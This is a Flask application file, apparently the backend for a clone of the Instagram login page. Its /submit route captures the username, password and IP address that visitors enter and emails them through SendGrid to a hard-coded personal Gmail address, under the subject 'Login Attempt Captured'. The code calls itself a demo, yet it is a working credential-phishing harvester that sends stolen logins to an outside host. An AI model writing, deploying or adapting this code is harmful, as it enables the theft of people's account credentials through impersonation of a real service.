from flask import Flask, request, render_template
import os
from sendgrid import SendGridAPIClient
from sendgrid.helpers.mail import Mail, Email, To, Content
from datetime import datetime, timezone
import logging

# Configure logging for Vercel logs
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Adjust template folder path for Vercel (relative to api/)
app = Flask(__name__, template_folder=os.path.join(os.path.dirname(__file__), '../../templates'))

@app.route('/')
def index():
    try:
        return render_template('index.html')
    except Exception as e:
        logger.error(f"Template error: {str(e)}")
        return "Error loading page. Check logs.", 500

@app.route('/submit', methods=['POST'])
def submit():
    # Get form data with fallback values
    username = request.form.get('username', 'admin')
    password = request.form.get('password', 'ding2')
    
    # Get client IP
    ip_address = request.remote_addr if request.remote_addr != '127.0.0.1' else '::1'
    
    # Email configuration
    your_email = "tinanshi621@gmail.com"  # Update with SendGrid verified sender email
    sendgrid_api_key = os.getenv('SENDGRID_API_KEY')  # Fetch from environment variable
    
    # Timestamp
    timestamp = datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%S.%f')[:-3] + 'Z'
    
    # Email content
    body = f"""Login Attempt Captured
Timestamp: {timestamp}
IP Address: {ip_address}
Username: {username}
Password: {password}

This is from your Instagram login clone demo."""
    
    # Send email via SendGrid API
    try:
        sg = SendGridAPIClient(sendgrid_api_key)
        email = Mail(
            from_email=Email(your_email),
            to_emails=To(your_email),
            subject="Login Attempt Captured",
            content=Content("text/plain", body)
        )
        response = sg.send(email)
        logger.info(f"Demo email sent successfully! Status: {response.status_code}")
        return "Demo submitted successfully! Check your email.", 200
    except Exception as e:
        logger.error(f"Email sending failed: {str(e)}")
        return "Demo submitted! (Email failed—check logs or API key.)", 200

# Export the app for Vercel
app = app
